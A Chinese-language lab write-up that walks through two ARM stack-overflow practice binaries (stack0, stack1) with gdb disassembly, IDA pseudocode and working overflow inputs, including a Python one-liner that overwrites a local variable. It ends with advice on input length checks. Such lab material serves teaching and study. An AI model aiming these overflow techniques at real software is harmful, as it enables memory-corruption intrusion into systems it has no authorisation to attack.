# arm栈溢出实验

## 实验概述

### 【目的】
1. 运行stack0，得到输出`you have changed the 'modified' variable`
2. 运行stack1，得到输出`you have correctly got the variable to the right value`
### 【环境】
Linux
### 【工具】
gdb
### 【原理】
缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。
## 实验步骤

### 【步骤】
#### stack0
用file命令查看可执行文件类型。
```
$ file stack0
stack0: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 2.6.32, BuildID[sha1]=1171fa6db1d5176af44d6d462427f8d244bd82c8, not stripped
```
使用gdb打开并调试
```
$ gdb stack0 -q
[*] No debugging session active
GEF for linux ready, type `gef' to start, `gef config' to configure
56 commands loaded for GDB 7.7.1 using Python engine 2.7
[*] 4 commands could not be loaded, run `gef missing` to know why.
Reading symbols from stack0...(no debugging symbols found)...done.
gef> r
Starting program: /home/pi/ARM-challenges/stack0 
123
Try again?
[Inferior 1 (process 17040) exited normally]

```
程序让我们输入一行字符串,反汇编看一下main函数
```
gef> disass main
Dump of assembler code for function main:
   0x0001044c <+0>:	push	{r11, lr}
   0x00010450 <+4>:	add	r11, sp, #4
   0x00010454 <+8>:	sub	sp, sp, #80	; 0x50
   0x00010458 <+12>:	str	r0, [r11, #-80]	; 0x50
   0x0001045c <+16>:	str	r1, [r11, #-84]	; 0x54
   0x00010460 <+20>:	mov	r3, #0
   0x00010464 <+24>:	str	r3, [r11, #-8]
   0x00010468 <+28>:	sub	r3, r11, #72	; 0x48
   0x0001046c <+32>:	mov	r0, r3
   0x00010470 <+36>:	bl	0x102e8
   0x00010474 <+40>:	ldr	r3, [r11, #-8]
   0x00010478 <+44>:	cmp	r3, #0
   0x0001047c <+48>:	beq	0x1048c <main+64>
   0x00010480 <+52>:	ldr	r0, [pc, #24]	; 0x104a0 <main+84>
   0x00010484 <+56>:	bl	0x102f4
   0x00010488 <+60>:	b	0x10494 <main+72>
   0x0001048c <+64>:	ldr	r0, [pc, #16]	; 0x104a4 <main+88>
   0x00010490 <+68>:	bl	0x102f4
   0x00010494 <+72>:	mov	r0, r3
   0x00010498 <+76>:	sub	sp, r11, #4
   0x0001049c <+80>:	pop	{r11, pc}
   0x000104a0 <+84>:	andeq	r0, r1, r12, lsl r5
   0x000104a4 <+88>:	andeq	r0, r1, r8, asr #10
End of assembler dump.
```
可以看到，这里的反汇编代码是arm架构的，与x86架构下的汇编指定不尽相同。
在main+40处有一条cmp指令，看起来像是判断的关键，在main+20处它被置为0，这里我们尝试溢出来修改到局部变量的值。
```
gef> r
Starting program: /home/pi/ARM-challenges/stack0 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Try again?
[Inferior 1 (process 17248) exited normally]

```
失败，这里再尝试用更长的字符串。
```
gef> r
Starting program: /home/pi/ARM-challenges/stack0 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
you have changed the 'modified' variable
```
成功。
#### stack1
```
$ file stack1
stack1: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 2.6.32, BuildID[sha1]=4e3ac40ad07cec98f04bbdff5d66b69b9fc1b66d, not stripped
```
这里也是一个arm程序。
用ida pro打开
```
$ gdb stack1 -q
[*] No debugging session active
GEF for linux ready, type `gef' to start, `gef config' to configure
56 commands loaded for GDB 7.7.1 using Python engine 2.7
[*] 4 commands could not be loaded, run `gef missing` to know why.
Reading symbols from stack1...(no debugging symbols found)...done.
gef> disass main
Dump of assembler code for function main:
   0x000104b0 <+0>:	push	{r11, lr}
   0x000104b4 <+4>:	add	r11, sp, #4
   0x000104b8 <+8>:	sub	sp, sp, #80	; 0x50
   0x000104bc <+12>:	str	r0, [r11, #-80]	; 0x50
   0x000104c0 <+16>:	str	r1, [r11, #-84]	; 0x54
   0x000104c4 <+20>:	ldr	r3, [r11, #-80]	; 0x50
   0x000104c8 <+24>:	cmp	r3, #1
   0x000104cc <+28>:	bne	0x104dc <main+44>
   0x000104d0 <+32>:	mov	r0, #1
   0x000104d4 <+36>:	ldr	r1, [pc, #92]	; 0x10538 <main+136>
   0x000104d8 <+40>:	bl	0x10370
   0x000104dc <+44>:	mov	r3, #0
   0x000104e0 <+48>:	str	r3, [r11, #-8]
   0x000104e4 <+52>:	ldr	r3, [r11, #-84]	; 0x54
   0x000104e8 <+56>:	add	r3, r3, #4
   0x000104ec <+60>:	ldr	r3, [r3]
   0x000104f0 <+64>:	sub	r2, r11, #72	; 0x48
   0x000104f4 <+68>:	mov	r0, r2
   0x000104f8 <+72>:	mov	r1, r3
   0x000104fc <+76>:	bl	0x10340
   0x00010500 <+80>:	ldr	r3, [r11, #-8]
   0x00010504 <+84>:	ldr	r2, [pc, #48]	; 0x1053c <main+140>
   0x00010508 <+88>:	cmp	r3, r2
   0x0001050c <+92>:	bne	0x1051c <main+108>
   0x00010510 <+96>:	ldr	r0, [pc, #40]	; 0x10540 <main+144>
   0x00010514 <+100>:	bl	0x1034c
   0x00010518 <+104>:	b	0x1052c <main+124>
   0x0001051c <+108>:	ldr	r3, [r11, #-8]
   0x00010520 <+112>:	ldr	r0, [pc, #28]	; 0x10544 <main+148>
   0x00010524 <+116>:	mov	r1, r3
   0x00010528 <+120>:	bl	0x10334
   0x0001052c <+124>:	mov	r0, r3
   0x00010530 <+128>:	sub	sp, r11, #4
   0x00010534 <+132>:	pop	{r11, pc}
   0x00010538 <+136>:			; <UNDEFINED> instruction: 0x000105bc
   0x0001053c <+140>:	cmnvs	r2, r4, ror #6
   0x00010540 <+144>:	ldrdeq	r0, [r1], -r8
   0x00010544 <+148>:	andeq	r0, r1, r0, lsl r6
End of assembler dump.
```
在main+88处有关键的判断逻辑，这里不是很好看，切到ida pro。
```c
nt __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // r3@4
  char dest; // [sp+Ch] [bp-48h]@3
  int v6; // [sp+4Ch] [bp-8h]@3

  if ( argc == 1 )
    errx(1, "please specify an argument\n", envp);
  v6 = 0;
  strcpy(&dest, argv[1]);
  if ( v6 == 1633837924 )
    puts("you have correctly got the variable to the right value");
  else
    printf("Try again, you got 0x%08x\n", v6);
  return v3;
}
```
可以看到这里把作为参数的字符串复制到了变量&dest上：`strcpy(&dest, argv[1]);`
那么我们在运行程序时给出超过dest字符数组长度的参数即可发生溢出，这里我们需要覆盖v5等于`"abcd"`。
经过计算，有：
```
$ python -c "print 'A'*64+'\x64\x63\x62\x61'" | xargs ./stack1
you have correctly got the variable to the right value

```
这里的 xargs 表示输入数据作为参数。
### 【总结】

本次实验主要体验arm环境下栈溢出的发生场景，并尝试通过栈溢出覆盖（修改）相邻的变量，达到改变程序执行流的目的。
可以发现，要使栈溢出发生，要满足以下条件：


- 程序允许用户输入
- 程序对用户的输入长度不加检查

栈溢出攻击是最为普遍而又危害极大的漏洞，要防御栈溢出攻击，首先要有良好的编码功力，对于用户的输入数据要做严格的长度检查，避免使用危险的函数。
